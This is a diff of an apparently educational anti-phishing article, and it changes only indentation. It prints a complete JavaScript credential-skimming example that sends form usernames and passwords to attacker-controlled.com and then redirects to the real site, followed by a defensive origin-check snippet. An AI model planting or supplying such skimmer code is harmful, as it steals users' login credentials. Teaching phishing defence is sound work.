@@ -114,18 +114,18 @@ The most common attack. Phishing pages mimic legitimate login forms. When you en
 ```javascript
 // Typical credential exfiltration script (malicious)
 document.getElementById('login-form').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-    
-    // Send to attacker's server
-    fetch('https://attacker-controlled.com/collect', {
-        method: 'POST',
-        body: JSON.stringify({ u: username, p: password })
-    });
-    
-    // Redirect to real site to avoid suspicion
-    window.location.href = 'https://legitimate-site.com/login';
+ e.preventDefault();
+ const username = document.getElementById('username').value;
+ const password = document.getElementById('password').value;
+
+ // Send to attacker's server
+ fetch('https://attacker-controlled.com/collect', {
+ method: 'POST',
+ body: JSON.stringify({ u: username, p: password })
+ });
+
+ // Redirect to real site to avoid suspicion
+ window.location.href = 'https://legitimate-site.com/login';
 });
 ```
 
@@ -200,7 +200,7 @@ If you maintain web applications, implement anti-phishing measures:
 ```javascript
 // Verify origin in your application
 if (window.location.origin !== 'https://your-app.com') {
-    console.warn('Potential phishing detected');
+ console.warn('Potential phishing detected');
 }
 
 // Implement subresource integrity
